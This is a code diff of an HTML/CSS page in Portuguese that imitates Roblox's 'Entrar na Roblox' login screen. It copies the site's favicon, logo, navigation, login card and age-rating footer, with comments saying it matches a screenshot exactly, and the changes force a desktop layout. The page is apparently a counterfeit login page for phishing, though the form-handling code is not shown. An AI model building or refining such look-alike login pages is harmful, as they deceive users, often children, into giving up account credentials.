@@ -2,129 +2,103 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=1024"> <!-- Força a versão Desktop -->
     <title>Entrar na Roblox</title>
     <link rel="icon" href="https://www.roblox.com/favicon.ico">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800&display=swap');
-        
+        /* Reset e Fonte Padrão do Roblox Web */
         * {
             margin: 0; padding: 0; box-sizing: border-box;
-            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
         body {
             background-color: #000000;
             color: #ffffff;
-            min-height: 100vh;
+            height: 100vh;
             display: flex;
             flex-direction: column;
-            overflow-x: hidden;
-            /* Imagem de fundo dos jogos com degradê escuro */
+            overflow: hidden;
+            /* Fundo com a galeria de jogos escurecida */
             background-image: 
-                linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%),
+                linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.8)),
                 url('https://images.rbxcdn.com/2c3e2e7b4e5f4a6e8c9d0e1f2a3b4c5d.jpg');
             background-size: cover;
             background-position: center;
             background-attachment: fixed;
         }
 
-        /* TOPBAR */
+        /* TOPBAR EXATA DO PRINT */
         .topbar {
             background-color: #191b1f;
+            height: 48px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 10px 16px;
+            padding: 0 24px;
             border-bottom: 1px solid #2e3134;
             z-index: 100;
-            height: 60px;
         }
 
-        .topbar-left { display: flex; align-items: center; gap: 12px; flex: 1; }
+        .topbar-left { display: flex; align-items: center; gap: 24px; }
         
-        /* Logo Quadrado Inclinado Exato do Print */
+        /* Logo Quadrada Inclinada */
         .logo-icon {
-            width: 32px;
-            height: 32px;
+            width: 32px; height: 32px;
             background-color: #ffffff;
             transform: rotate(-15deg);
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            border-radius: 3px;
+            display: flex; align-items: center; justify-content: center;
         }
-        .logo-hole {
-            width: 10px;
-            height: 10px;
-            background-color: #191b1f;
-        }
+        .logo-hole { width: 10px; height: 10px; background-color: #191b1f; }
 
+        .nav-links { display: flex; gap: 20px; font-size: 15px; font-weight: 600; color: #e3e3e3; }
+        .nav-links span { cursor: pointer; }
+        .nav-links span.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 14px;}
+
+        .topbar-right { display: flex; align-items: center; gap: 12px; }
+        
         .search-bar {
-            background-color: #272a2e;
-            border: 1px solid #3b3f43;
-            border-radius: 8px;
-            padding: 8px 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex: 1;
-            max-width: 250px;
-            color: #9ea2a6;
-            font-size: 14px;
+            background-color: #272a2e; border: 1px solid #3b3f43;
+            border-radius: 6px; padding: 6px 12px;
+            display: flex; align-items: center; gap: 8px;
+            width: 300px; color: #9ea2a6; font-size: 14px;
         }
-
-        .topbar-right { display: flex; align-items: center; gap: 10px; }
 
         .btn-cadastrar {
             background-color: #335fff; color: #fff; border: none;
-            padding: 8px 14px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
+            padding: 8px 16px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
         }
 
         .btn-entrar-top {
             background-color: transparent; color: #fff; border: 1px solid #ffffff;
-            padding: 8px 14px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
+            padding: 8px 16px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer;
         }
-
-        /* NAVEGAÇÃO */
-        .nav-mobile {
-            display: flex;
-            justify-content: space-around;
-            background-color: #191b1f;
-            padding: 14px 0;
-            border-bottom: 1px solid #2e3134;
-            font-size: 15px;
-            font-weight: 600;
-            color: #e3e3e3;
-        }
-        .nav-mobile span.active { color: #fff; border-bottom: 2px solid #fff; padding-bottom: 12px; margin-bottom: -14px; }
 
         /* ÁREA CENTRAL */
         .main-area {
             flex: 1;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
-            padding: 20px 16px;
             position: relative;
         }
 
-        /* CAIXA DE LOGIN */
+        /* CAIXA DE LOGIN FINA */
         .login-card {
             background-color: #232527;
             width: 100%;
-            max-width: 420px;
+            max-width: 360px; /* Deixei mais fina */
             border-radius: 8px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+            padding: 32px 24px; /* Padding interno menor */
+            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
             border: 1px solid #3b3f43;
             z-index: 10;
-            margin-top: 10px;
         }
 
         .login-card h1 {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
             text-align: center;
             margin-bottom: 24px;
@@ -134,10 +108,10 @@
 
         .input-group input {
             width: 100%;
-            padding: 14px;
+            padding: 10px 12px; /* Inputs mais baixos */
             background-color: #191b1f;
             border: 1px solid #3b3f43;
-            border-radius: 8px;
+            border-radius: 6px;
             color: #fff;
             font-size: 15px;
             outline: none;
@@ -147,10 +121,10 @@
 
         .btn-main {
             width: 100%;
-            padding: 14px;
+            padding: 12px; /* Botão mais fino */
             background-color: #232527;
             border: 1px solid #ffffff;
-            border-radius: 8px;
+            border-radius: 6px;
             color: #ffffff;
             font-size: 15px;
             font-weight: 600;
@@ -166,7 +140,7 @@
             color: #ffffff;
             text-decoration: none;
             font-size: 14px;
-            margin: 20px 0;
+            margin: 16px 0;
             font-weight: 600;
         }
 
@@ -174,12 +148,12 @@
 
         .btn-secondary {
             width: 100%;
-            padding: 14px;
+            padding: 12px; /* Botões secundários finos */
             background-color: #272a2e;
             border: 1px solid #3b3f43;
-            border-radius: 8px;
+            border-radius: 6px;
             color: #ffffff;
-            font-size: 14px;
+            font-size: 15px;
             font-weight: 600;
             margin-bottom: 12px;
             cursor: pointer;
@@ -187,28 +161,25 @@
 
         .btn-secondary:active { background-color: #3b3f43; }
 
-        .signup-text { text-align: center; color: #e3e3e3; font-size: 14px; margin-top: 24px; }
+        .signup-text { text-align: center; color: #e3e3e3; font-size: 14px; margin-top: 20px; }
         .signup-text a { color: #ffffff; font-weight: 700; text-decoration: none; }
 
-        /* RODAPÉ CLASSIFICAÇÃO (Exato do Print) */
+        /* RODAPÉ FIXO NO FUNDO */
         .footer-rating {
-            background-color: #000000; /* Fundo preto */
-            width: 100%;
-            max-width: 420px;
-            padding: 20px;
+            background-color: #191b1f;
+            padding: 12px 0;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            margin-top: 15px; /* Fica logo abaixo do card */
-            border-radius: 4px;
+            border-top: 1px solid #2e3134;
         }
 
         .footer-text {
-            font-size: 13px;
-            font-weight: 800;
+            font-size: 12px;
+            font-weight: 700;
             color: #fff;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             letter-spacing: 0.5px;
             text-transform: uppercase;
         }
@@ -219,17 +190,16 @@
             color: #000;
             border-radius: 4px;
             overflow: hidden;
-            width: 100%;
-            max-width: 320px;
-            margin-bottom: 12px;
+            width: 300px;
+            margin-bottom: 8px;
         }
 
         .rating-red-box {
             background-color: #ff0000;
             color: #fff;
-            font-size: 32px;
+            font-size: 28px;
             font-weight: 900;
-            padding: 15px 25px;
+            padding: 10px 20px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -249,15 +219,7 @@
             font-size: 12px;
             text-align: center;
             color: #e3e3e3;
-            line-height: 1.5;
-        }
-
-        /* Ajustes para telas maiores (Desktop) */
-        @media (min-width: 768px) {
-            .topbar { padding: 0 24px; }
-            .nav-mobile { display: none; } /* Esconde o menu mobile no PC */
-            .logo-icon { width: 36px; height: 36px; }
-            .search-bar { max-width: 300px; }
+            line-height: 1.4;
         }
     </style>
 </head>
@@ -266,31 +228,27 @@
     <!-- TOPBAR -->
     <div class="topbar">
         <div class="topbar-left">
-            <!-- Quadrado do Roblox -->
             <div class="logo-icon"><div class="logo-hole"></div></div>
-            
+            <div class="nav-links">
+                <span class="active">Destaques</span>
+                <span>Mercado</span>
+                <span>Criar</span>
+                <span>Robux</span>
+            </div>
+        </div>
+        <div class="topbar-right">
             <div class="search-bar">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9ea2a6" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                 Pesquisar
             </div>
-        </div>
-        <div class="topbar-right">
             <button class="btn-cadastrar">Cadastrar-se</button>
             <button class="btn-entrar-top">Entrar</button>
         </div>
     </div>
 
-    <!-- NAVEGAÇÃO -->
-    <div class="nav-mobile">
-        <span class="active">Destaques</span>
-        <span>Mercado</span>
-        <span>Criar</span>
-        <span>Robux</span>
-    </div>
-
     <!-- ÁREA CENTRAL -->
     <div class="main-area">
-        <!-- CARD DE LOGIN -->
+        <!-- CAIXA DE LOGIN -->
         <div class="login-card">
             <h1>Entrar na Roblox</h1>
             
@@ -315,20 +273,18 @@
                 Não possui uma conta? <a href="#">Cadastrar-se</a>
             </div>
         </div>
+    </div>
 
-        <!-- RODAPÉ CLASSIFICAÇÃO -->
-        <div class="footer-rating">
-            <div class="footer-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
-            
-            <div class="rating-box">
-                <div class="rating-red-box">16</div>
-                <div class="rating-text-box">Violência</div>
-            </div>
-            
-            <div class="footer-desc">
-                Interação entre usuários<br>
-                Compras no jogo (inclui itens aleatórios)
-            </div>
+    <!-- RODAPÉ -->
+    <div class="footer-rating">
+        <div class="footer-text">CLASSIFICAÇÃO INDICATIVA: 16 ANOS</div>
+        <div class="rating-box">
+            <div class="rating-red-box">16</div>
+            <div class="rating-text-box">Violência</div>
+        </div>
+        <div class="footer-desc">
+            Interação entre usuários<br>
+            Compras no jogo (inclui itens aleatórios)
         </div>
     </div>
 
